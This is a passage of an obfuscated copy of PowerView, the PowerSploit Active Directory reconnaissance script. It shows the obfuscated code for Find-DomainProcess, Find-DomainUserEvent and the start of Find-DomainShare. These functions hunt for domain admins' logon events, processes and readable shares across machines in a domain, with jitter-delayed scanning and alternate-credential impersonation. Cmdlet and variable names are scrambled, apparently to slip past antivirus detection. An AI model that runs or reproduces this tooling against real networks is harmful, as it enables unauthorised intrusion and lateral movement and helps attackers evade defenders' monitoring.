                            if (${PR`oCess`NAME} -Contains ${ProC`e`Ss}.ProcessName) {
                                ${Pr`o`cESS}
                            }
                        }
                        # if the session user is in the target list, display some output
                        elseif (${TA`RgEtU`Sers} -Contains ${pR`O`ceSs}.User) {
                            ${P`RoceSs}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${PSBOun`DParAm`E`TerS}['Delay'] -or ${p`s`BOu`NDp`AramEtE`RS}['StopOnSuccess']) {

            &("{2}{4}{0}{1}{3}" -f 'ite-Ve','rb','W','ose','r') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            &("{1}{0}{3}{2}" -f'te','Wri','ose','-Verb') "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            ${c`ount`er} = 0
            ${raN`DnO} = &("{2}{0}{1}"-f 'c','t','New-Obje') ("{3}{1}{0}{2}"-f'R','tem.','andom','Sys')

            ForEach (${TArg`E`TCo`mPUTer} in ${T`ARg`eTCo`mP`UTERS}) {
                ${c`o`UnteR} = ${C`oUNt`eR} + 1

                # sleep for our semi-randomized interval
                &("{3}{1}{0}{2}" -f 'le','S','ep','Start-') -Seconds ${RaNd`No}.Next((1-${J`ITter})*${D`ELaY}, (1+${j`It`TEr})*${Del`Ay})

                &("{0}{2}{3}{1}"-f'Wr','ose','i','te-Verb') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                ${r`ESulT} = &("{1}{0}{2}{3}" -f 'vok','In','e','-Command') -ScriptBlock ${hoStENuM`Bl`Ock} -ArgumentList ${TARg`E`TC`oMpuT`eR}, ${t`ArgeTpro`ceS`SNAmE}, ${TaR`Ge`TUS`ERS}, ${c`R`ede`NTIAl}
                ${RES`U`Lt}

                if (${R`ES`UlT} -and ${STO`Po`N`sUCcess}) {
                    &("{0}{2}{1}"-f 'Wr','e','ite-Verbos') "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            &("{0}{2}{1}" -f'W','-Verbose','rite') "[Find-DomainProcess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${SCRIP`T`PA`RA`mS} = @{
                'ProcessName' = ${T`Arg`Et`prOCeSSnA`me}
                'TargetUsers' = ${taR`gE`TUSErS}
                'Credential' = ${cRE`d`en`TIAl}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{4}{2}{1}{3}{0}{5}"-f 'cti','eaded','r','Fun','New-Th','on') -ComputerName ${TAR`G`etC`omp`UTErS} -ScriptBlock ${ho`sT`Enum`BlOCk} -ScriptParameters ${sCRI`pt`paRaMS} -Threads ${thREA`ds}
        }
    }
}


function fiNd-d`om`AiNuseRevE`Nt {
<#
.SYNOPSIS

Finds logon events on the current (or remote domain) for the specified users.

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  

.DESCRIPTION

Enumerates all domain controllers from the specified -Domain
(default of the local domain) using Get-DomainController, enumerates
the logon events for each using Get-DomainUserEvent, and filters
the results based on the targeting criteria.

.PARAMETER ComputerName

Specifies an explicit computer name to retrieve events from.

.PARAMETER Domain

Specifies a domain to query for domain controllers to enumerate.
Defaults to the current domain.

.PARAMETER Filter

A hashtable of PowerView.LogonEvent properties to filter for.
The 'op|operator|operation' clause can have '&', '|', 'and', or 'or',
and is 'or' by default, meaning at least one clause matches instead of all.
See the exaples for usage.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events (per host) to retrieve. Default of 5000.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer(s).

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserEvent

Search for any user events matching domain admins on every DC in the current domain.

.EXAMPLE

$cred = Get-Credential dev\administrator
Find-DomainUserEvent -ComputerName 'secondary.dev.testlab.local' -UserIdentity 'john'

Search for any user events matching the user 'john' on the 'secondary.dev.testlab.local'
domain controller using the alternate credential

.EXAMPLE

'primary.testlab.local | Find-DomainUserEvent -Filter @{'IpAddress'='192.168.52.200|192.168.52.201'}

Find user events on the primary.testlab.local system where the event matches
the IPAddress '192.168.52.200' or '192.168.52.201'.

.EXAMPLE

$cred = Get-Credential testlab\administrator
Find-DomainUserEvent -Delay 1 -Filter @{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; 'TargetLogonId' = '10238128'; 'op'='&'}

Find user events mathing the specified GUID AND the specified TargetLogonId, searching
through every domain controller in the current domain, enumerating each DC in serial
instead of in a threaded manner, using the alternate credential.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogon

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COM`PutER`NAmE},

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`main},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${Fil`TeR},

        [Parameter(ValueFromPipelineByPropertyName = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${sta`RTt`I`ME} = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${E`N`dtIme} = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        ${ma`x`eVeNTS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${UsERI`Den`T`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UsE`RdoM`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${user`l`D`ApfIltER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${user`SEA`RcHB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${USE`RgrO`UPi`dEntI`Ty} = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        ${U`SE`RAD`mInCo`UNt},

        [Switch]
        ${c`HeCK`A`ccesS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sea`RCHS`C`Ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`su`LT`PAg`ESIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`Ver`Time`LIMIT},

        [Switch]
        ${T`OM`B`StonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReD`eNTi`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`To`P`onSu`CCeSs},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`elAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JIT`T`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tHR`e`Ads} = 20
    )

    BEGIN {
        ${uSErS`EAr`cHErArG`Um`EN`Ts} = @{
            'Properties' = 'samaccountname'
        }
        if (${PsBOUN`DPA`R`A`meTeRS}['UserIdentity']) { ${u`se`RsEArcHe`RAr`gUme`NTs}['Identity'] = ${U`sE`RidenT`ity} }
        if (${P`sBOUNDpA`RAmE`TErS}['UserDomain']) { ${U`seRs`e`ArcH`ERar`GUMEn`Ts}['Domain'] = ${US`ER`D`omAiN} }
        if (${psbOund`Pa`Ra`ME`TeRs}['UserLDAPFilter']) { ${US`ERSEARCh`EraR`gUm`e`N`TS}['LDAPFilter'] = ${u`Se`Rld`APfi`lTER} }
        if (${PsB`ou`ND`PARa`mETErs}['UserSearchBase']) { ${U`s`eRse`A`RChEra`R`guMENtS}['SearchBase'] = ${usEr`seARChB`ASe} }
        if (${p`sB`O`UNdPaRa`MEterS}['UserAdminCount']) { ${uSEr`s`EARCHE`RaRG`UmenTS}['AdminCount'] = ${UsERaD`MINC`Ou`NT} }
        if (${P`sboUNDpA`RA`MeTErS}['Server']) { ${UsEr`seA`RCHera`RgU`MENts}['Server'] = ${seRV`ER} }
        if (${PsB`oUNdPAr`AmE`T`Ers}['SearchScope']) { ${Use`R`SEA`Rch`eRA`RGuM`entS}['SearchScope'] = ${sea`R`chScope} }
        if (${p`SBOUn`d`pa`Rame`TERS}['ResultPageSize']) { ${usE`RSe`ARCHe`R`ARgum`eN`TS}['ResultPageSize'] = ${res`ULTp`AgEsi`Ze} }
        if (${PsbO`UnD`PARaM`etE`RS}['ServerTimeLimit']) { ${UsEr`SeA`R`chE`R`ARgum`eNtS}['ServerTimeLimit'] = ${SERVE`RT`I`me`limIT} }
        if (${ps`BounDPArA`mET`Ers}['Tombstone']) { ${USEr`sea`RCH`E`RArG`Um`eNTS}['Tombstone'] = ${tOMBst`o`NE} }
        if (${PsBO`UN`d`pAram`eTerS}['Credential']) { ${Us`erS`EArchE`RaRg`U`m`eNtS}['Credential'] = ${CrE`Dent`iAl} }

        if (${P`SboU`NdP`Ar`AMe`TERS}['UserIdentity'] -or ${PSB`oUN`DP`ARAmetE`RS}['UserLDAPFilter'] -or ${PsB`OUNdP`ArA`MetERs}['UserSearchBase'] -or ${PS`B`o`Un`dPA`RaMEters}['UserAdminCount']) {
            ${tAR`ge`TUSe`Rs} = &("{1}{4}{2}{0}{3}" -f 'nUse','G','t-Domai','r','e') @UserSearcherArguments | &("{0}{1}{3}{2}"-f 'Select','-Obj','ct','e') -ExpandProperty ("{0}{2}{3}{1}"-f'sa','e','m','accountnam')
        }
        elseif (${psBOUnDP`AR`A`METe`RS}['UserGroupIdentity'] -or (-not ${P`s`BOuNdPaRA`MEtERs}['Filter'])) {
            # otherwise we're querying a specific group
            ${Gr`o`Up`s`eAr`CHE`RArgUMENts} = @{
                'Identity' = ${UsERG`RO`U`PI`DeNTitY}
                'Recurse' = ${TR`Ue}
            }
            &("{2}{1}{0}"-f 'ose','te-Verb','Wri') "UserGroupIdentity: $UserGroupIdentity"
            if (${pSBO`U`N`D`pArA`meTerS}['UserDomain']) { ${gro`UPSe`AR`CHer`A`RgumE`NTs}['Domain'] = ${US`ER`Do`MAIn} }
            if (${PSBOUn`d`pa`RA`ME`TErS}['UserSearchBase']) { ${G`ROupS`ea`RChERargUMenTs}['SearchBase'] = ${USe`RSe`Arc`h`BAsE} }
            if (${PsBO`UN`dPaR`AmeT`Ers}['Server']) { ${groUpsE`ARCher`Argu`m`e`NtS}['Server'] = ${SEr`VER} }
            if (${Ps`Bo`UNd`PArAmet`e`RS}['SearchScope']) { ${Gr`O`U`pS`EaRCh`eRArGuM`ENTS}['SearchScope'] = ${sEAr`C`Hs`cOPE} }
            if (${PsB`OuNDP`ArAme`TERS}['ResultPageSize']) { ${G`ROUPSE`ARc`H`e`RaR`GUme`NTs}['ResultPageSize'] = ${rEsUL`Tpa`GE`SIze} }
            if (${Psboun`d`pAr`Ame`TeRS}['ServerTimeLimit']) { ${gR`oU`PsEArChe`R`ARG`UMentS}['ServerTimeLimit'] = ${s`erV`ertimElimIT} }
            if (${p`Sbou`NDpARA`m`Et`eRS}['Tombstone']) { ${g`R`OU`PsEARChER`ArGUMENtS}['Tombstone'] = ${T`oM`BStonE} }
            if (${psBo`UndPA`Ra`mETerS}['Credential']) { ${gR`oU`p`sEa`R`ChERArguMenTS}['Credential'] = ${cr`EDE`Ntial} }
            ${TAR`gEtUs`ERs} = &("{3}{4}{2}{1}{0}" -f 'r','e','mb','G','et-DomainGroupMe') @GroupSearcherArguments | &("{0}{1}{3}{2}"-f'Sele','ct','Object','-') -ExpandProperty ("{1}{0}{2}"-f'rNam','Membe','e')
        }

        # build the set of computers to enumerate
        if (${pSbo`U`ND`PARam`et`ERS}['ComputerName']) {
            ${tarG`E`TCoM`PUte`Rs} = ${CoMP`U`TER`NA`ME}
        }
        else {
            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
            ${D`CseArC`hERaRGUM`EnTS} = @{
                'LDAP' = ${T`RuE}
            }
            if (${p`SBOundPAr`AME`TE`RS}['Domain']) { ${DCs`E`A`RcheRAr`Gu`M`ents}['Domain'] = ${do`mAIn} }
            if (${PSbouNdP`AR`AMEt`e`Rs}['Server']) { ${D`cseARcHE`RA`RGUME`Nts}['Server'] = ${sEr`VeR} }
            if (${pSbo`UndPA`Ram`eTers}['Credential']) { ${D`csEar`cheRA`RgUMents}['Credential'] = ${c`R`EDe`Ntial} }
            &("{3}{4}{1}{2}{0}" -f 'bose','-Ve','r','Wr','ite') "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            ${t`ArgetCOMpuTE`Rs} = &("{4}{0}{2}{1}{3}{5}" -f 'Domai','C','n','ontro','Get-','ller') @DCSearcherArguments | &("{2}{1}{0}{3}"-f 'jec','-Ob','Select','t') -ExpandProperty ("{3}{0}{2}{1}" -f 'n','me','shostna','d')
        }
        if (${t`Ar`ge`TCOMpUT`ERs} -and (${TaRgE`T`cOmPUt`ErS} -isnot [System.Array])) {
            ${t`ArGe`TCoM`pUT`ERS} = @(,${T`ArG`Et`COMPU`TERs})
        }
        &("{0}{1}{2}" -f'Wr','ite-Ve','rbose') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        &("{2}{1}{0}"-f 'e','s','Write-Verbo') "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if (${tA`R`GeTCOmPuTE`Rs}.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        ${HoS`TeNUMb`L`O`Ck} = {
            Param(${CO`mPuter`NA`mE}, ${st`Ar`T`TiME}, ${eN`Dti`Me}, ${MAX`eV`en`Ts}, ${tAr`Ge`TUse`Rs}, ${Fi`lT`Er}, ${CrEDE`N`Ti`AL})

            ForEach (${TAR`GeTCo`m`PuTEr} in ${co`mP`UT`erN`AmE}) {
                ${Up} = &("{2}{3}{1}{0}"-f 'ction','onne','Test','-C') -Count 1 -Quiet -ComputerName ${t`Arg`etCom`pU`TER}
                if (${uP}) {
                    ${DOm`AI`Nus`erEV`EntARGs} = @{
                        'ComputerName' = ${tAr`gE`TCO`mp`Uter}
                    }
                    if (${S`TA`RTtime}) { ${doM`AINusE`ReveNTa`RgS}['StartTime'] = ${sTar`T`T`ImE} }
                    if (${End`T`imE}) { ${DoMaInU`S`ErEveNT`AR`Gs}['EndTime'] = ${E`ND`TiME} }
                    if (${mA`Xe`VE`Nts}) { ${DO`MaINUS`EReVEn`Ta`RGS}['MaxEvents'] = ${m`A`XEvEnTS} }
                    if (${CR`EDE`NTI`Al}) { ${domaInU`SErEv`E`N`TA`RGS}['Credential'] = ${Cred`e`NtiAl} }
                    if (${f`iLt`er} -or ${TA`RG`eTuserS}) {
                        if (${t`Arg`eT`UsErs}) {
                            &("{5}{0}{1}{3}{2}{4}"-f'et-Dom','ain','er','Us','Event','G') @DomainUserEventArgs | &("{2}{1}{0}"-f'ect','Obj','Where-') {${tA`Rg`Et`USErS} -contains ${_}.TargetUserName}
                        }
                        else {
                            ${Oper`At`OR} = 'or'
                            ${F`ILTer}.Keys | &("{2}{0}{1}{3}"-f'orEach-Obj','ec','F','t') {
                                if ((${_} -eq 'Op') -or (${_} -eq 'Operator') -or (${_} -eq 'Operation')) {
                                    if ((${F`Ilt`Er}[${_}] -match '&') -or (${Fil`TEr}[${_}] -eq 'and')) {
                                        ${O`P`eRaTor} = 'and'
                                    }
                                }
                            }
                            ${kE`ys} = ${fiLt`ER}.Keys | &("{0}{2}{1}{3}" -f 'W','e-Objec','her','t') {(${_} -ne 'Op') -and (${_} -ne 'Operator') -and (${_} -ne 'Operation')}
                            &("{4}{0}{1}{2}{3}"-f'e','rEv','en','t','Get-DomainUs') @DomainUserEventArgs | &("{1}{0}{2}" -f 'Each-Objec','For','t') {
                                if (${o`P`ErAT`oR} -eq 'or') {
                                    ForEach (${K`eY} in ${kE`ys}) {
                                        if (${_}."$Key" -match ${FI`L`Ter}[${k`eY}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    # and all clauses
                                    ForEach (${k`ey} in ${K`eYs}) {
                                        if (${_}."$Key" -notmatch ${F`ilt`er}[${k`eY}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{1}{3}{4}{0}{2}" -f'rEven','Get-Do','t','mainUs','e') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${PSB`ou`N`Dpa`RAMeteRS}['Delay'] -or ${P`S`Bound`P`ARAmETeRs}['StopOnSuccess']) {

            &("{0}{1}{2}" -f'Write','-Verb','ose') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            &("{1}{2}{0}{3}"-f'e-Verb','Wri','t','ose') "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            ${c`OUnt`eR} = 0
            ${ranD`NO} = &("{2}{1}{0}{3}" -f'e','j','New-Ob','ct') ("{0}{1}{2}"-f 'S','ystem.Ran','dom')

            ForEach (${TA`R`ge`TcOmpuTeR} in ${TARGe`TcOMp`UtE`RS}) {
                ${cO`UN`TER} = ${COU`N`Ter} + 1

                # sleep for our semi-randomized interval
                &("{1}{0}{2}{3}" -f'rt-S','Sta','le','ep') -Seconds ${ra`NDNo}.Next((1-${jIT`Ter})*${D`eL`AY}, (1+${JiT`TER})*${d`EL`AY})

                &("{3}{2}{1}{0}" -f 'erbose','V','-','Write') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                ${re`sUlT} = &("{3}{2}{1}{0}" -f'nd','a','e-Comm','Invok') -ScriptBlock ${hoStE`N`U`MB`LOCK} -ArgumentList ${tarGE`T`coM`put`ER}, ${S`TART`TiME}, ${eN`dt`imE}, ${maxEve`N`TS}, ${TA`RGe`TUS`ErS}, ${FI`lt`Er}, ${C`REdENt`I`AL}
                ${R`E`SuLT}

                if (${ReS`ULt} -and ${STo`poNs`UcceSS}) {
                    &("{1}{2}{0}" -f'e','Write-Ve','rbos') "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}"-f'te-Ve','Wri','rbose') "[Find-DomainUserEvent] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${scR`I`pt`parAMS} = @{
                'StartTime' = ${st`ArT`TiMe}
                'EndTime' = ${E`NDtIme}
                'MaxEvents' = ${m`Axev`entS}
                'TargetUsers' = ${tarGe`TUse`RS}
                'Filter' = ${fiL`T`ER}
                'Credential' = ${crEdeN`TI`AL}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{0}{1}{2}{3}"-f 'New-Threaded','Fu','n','ction') -ComputerName ${t`ArG`e`TCOMpuTers} -ScriptBlock ${ho`STEnu`MblO`ck} -ScriptParameters ${sC`RI`PTPAra`ms} -Threads ${t`hRe`Ads}
        }
    }
}


function FiND-d`o`Mai`NsH`ArE {
<#
.SYNOPSIS

Searches for computer shares on the domain. If -CheckShareAccess is passed,
then only shares the current user has read access to are returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. If -CheckShareAccess is passed, then
[IO.Directory]::GetFiles() is used to check if the current user has read
access to the given share. If -Credential is passed, then
Invoke-UserImpersonation is used to impersonate the specified user before
enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainShare

Find all domain shares in the current domain.

.EXAMPLE

Find-DomainShare -CheckShareAccess

Find all domain shares in the current domain that the current user has
read access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches for domain shares in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.ShareInfo
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('DNSHostName')]
        [String[]]
        ${c`OmpUtERN`Ame},

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        ${coMpu`Te`RdoM`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmP`U`TERLD`A`pFIl`T`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMpUt`e`R`Se`A`RChbASe},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${c`omPuTeRope`RAT`I`NgsysT`Em},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${comPu`Ters`ervi`C`eP`A`CK},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${CoMPUt`ER`S`Iten`Ame},

        [Alias('CheckAccess')]
        [Switch]
        ${Ch`E`cKS`HAr`EAcc`ESs},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SER`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEAr`CH`S`coPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSuLT`p`AgESi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvErtI`m`ELim`IT},

        [Switch]
        ${tomB`ST`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ed`En`TiAL} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eLAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`It`Ter} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${Th`Reads} = 20
    )

    BEGIN {

        ${c`O`MpUTERS`E`ARcHE`RaR`GumeNtS} = @{
            'Properties' = 'dnshostname'
        }
        if (${psB`oUnD`PaRam`EtERs}['ComputerDomain']) { ${COMPuTer`seaR`cH`ER`ArguMeNTs}['Domain'] = ${coM`PuT`ErdOmAiN} }
        if (${PS`BouNDParAM`ET`ERS}['ComputerLDAPFilter']) { ${cO`MP`UT`ersEA`RCHE`RARG`UMen`TS}['LDAPFilter'] = ${COMPUT`eR`ld`APF`I`LTEr} }
        if (${pS`BounDpAR`A`MeTeRs}['ComputerSearchBase']) { ${Co`mPUTERSeaR`CH`era`RG`Um`eNtS}['SearchBase'] = ${comPut`ER`SE`ARc`H`B`ASe} }
        if (${pS`BouN`dp`ARaM`eTe`Rs}['Unconstrained']) { ${c`o`M`PUtER`SEa`RcHerArgume`NTS}['Unconstrained'] = ${uncOn`StrAIN`eD} }
        if (${PS`BOuNdPar`A`ME`T`ErS}['ComputerOperatingSystem']) { ${CO`M`pUtE`R`SEARC`hER`A`RguMeNts}['OperatingSystem'] = ${oPE`R`AtinGSYsteM} }
        if (${PSb`OUndp`ArA`mE`Te`RS}['ComputerServicePack']) { ${cOMp`UtE`RSEA`Rc`HERARGuMe`N`Ts}['ServicePack'] = ${SeR`VICEpa`cK} }
        if (${PsBO`Un`DpaRa`Me`TerS}['ComputerSiteName']) { ${com`PuteR`sEAr`cHe`RARgumen`Ts}['SiteName'] = ${sIT`eNAme} }
        if (${psB`o`UNd`p`A`RameteRS}['Server']) { ${Co`m`p`UtERsEa`RcHErar`gUmEnTs}['Server'] = ${s`eRv`Er} }
        if (${pSBo`UN`Dpar`AmE`TErs}['SearchScope']) { ${cOMPuT`erSE`ArcHeR`A`RguMeNtS}['SearchScope'] = ${SeaRC`h`SCopE} }
        if (${PSBOuNdPAr`A`mE`T`erS}['ResultPageSize']) { ${co`MP`UTE`Rs`ear`c`heRarG`UMen`TS}['ResultPageSize'] = ${RE`sULt`pA`g`EsIze} }
        if (${PsboU`N`dp`A`RAmeTe`RS}['ServerTimeLimit']) { ${COmpU`TE`RSeARCHE`Ra`RGu`m`E`Nts}['ServerTimeLimit'] = ${SerVeR`T`ImELi`mit} }
        if (${pSB`Ou`Nd`paR`Ameters}['Tombstone']) { ${c`omPU`TERSea`RCH`eRArgUmEnts}['Tombstone'] = ${To`MbsTO`Ne} }
        if (${pS`Bo`UnDP`ARAmeT`eRs}['Credential']) { ${c`o`m`PU`TeR`SE`ArchEraRGuMENts}['Credential'] = ${crED`E`Ntial} }

        if (${Psbo`U`NDPA`RamET`ERS}['ComputerName']) {
            ${t`A`RgetCoMput`E`RS} = ${cO`mPUTErN`Ame}
        }
        else {
            &("{0}{1}{2}" -f 'Wr','ite-Verbo','se') '[Find-DomainShare] Querying computers in the domain'
            ${tArgetC`OM`p`UtERS} = &("{2}{1}{4}{0}{3}" -f'm','mai','Get-Do','puter','nCo') @ComputerSearcherArguments | &("{0}{2}{1}"-f'Select-','bject','O') -ExpandProperty ("{2}{1}{0}"-f 'e','nam','dnshost')
        }
        &("{1}{0}{2}" -f'e-Ver','Writ','bose') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if (${TA`R`GeTcomputErs}.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        ${h`OSTE`N`UmBlOCk} = {
            Param(${cO`mp`UTe`Rna`mE}, ${checKS`Ha`RE`ACc`esS}, ${t`ok`ENHaN`DLe})

            if (${To`kENHa`Nd`le}) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
